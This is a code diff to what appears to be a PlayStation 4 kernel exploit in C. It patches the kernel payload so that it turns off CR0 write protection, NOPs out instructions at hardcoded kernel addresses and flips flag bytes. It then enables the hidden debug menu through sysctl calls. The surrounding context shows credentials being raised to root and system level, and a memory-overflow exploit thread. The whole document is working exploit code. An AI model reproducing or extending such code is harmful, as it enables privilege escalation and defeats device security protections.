@@ -32,12 +32,17 @@ void payload(struct knote *kn) {
 	// Disable write protection
 	uint64_t cr0 = readCr0();
 	writeCr0(cr0 & ~X86_CR0_WP);
-
-	// Patch functions here if required
-
+	
+	// sysctl_machdep_rcmgr_debug_menu and sysctl_machdep_rcmgr_store_moe
+	*(uint16_t *)0xFFFFFFFF82607C46 = 0x9090;
+	*(uint16_t *)0xFFFFFFFF82607826 = 0x9090;
+	
+	*(char *)0xFFFFFFFF8332431A = 1;
+	*(char *)0xFFFFFFFF83324338 = 1;
+	
 	// Restore write protection
 	writeCr0(cr0);
-
+	
 	// Resolve creds
 	cred = td->td_proc->p_ucred;
 
@@ -48,7 +53,7 @@ void payload(struct knote *kn) {
 	cred->cr_groups[0] = 0;
 
 	void *td_ucred = *(void **)(((char *)td) + 304); // p_ucred == td_ucred
-
+	
 	// sceSblACMgrIsSystemUcred
 	uint64_t *sonyCred = (uint64_t *)(((char *)td_ucred) + 96);
 	*sonyCred = 0xffffffffffffffff;
@@ -101,11 +106,8 @@ void *exploitThread(void *none) {
 	uint64_t mappingSize = (copySize + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1);
 	
 	uint8_t *mapping = mmap(NULL, mappingSize + PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
-	
-	// Ensure end of mapping is unmapped
 	munmap(mapping + mappingSize, PAGE_SIZE);
 	
-	// buffer + copySize points to unmapped memory
 	uint8_t *buffer = mapping + mappingSize - copySize;
 	
 	int64_t count = (0x100000000 + bufferSize) / 4;
@@ -246,7 +248,18 @@ int _main(void) {
 
 	printfsocket("[+] Kernel patch success!\n");
 
-	// Do any post-exploit stuff here
+	// Enable debug menu
+	int (*sysctlbyname)(const char *name, void *oldp, size_t *oldlenp, const void *newp, size_t newlen) = NULL;
+	RESOLVE(libKernelHandle, sysctlbyname);
+	
+	uint32_t enable;
+	size_t size;
+	
+	enable = 1;
+	size = sizeof(enable);
+	
+	sysctlbyname("machdep.rcmgr_utoken_store_mode", NULL, NULL, &enable, size);
+	sysctlbyname("machdep.rcmgr_debug_menu", NULL, NULL, &enable, size);
 	
 #ifdef DEBUG_SOCKET
 	munmap(dump, PAGE_SIZE);	
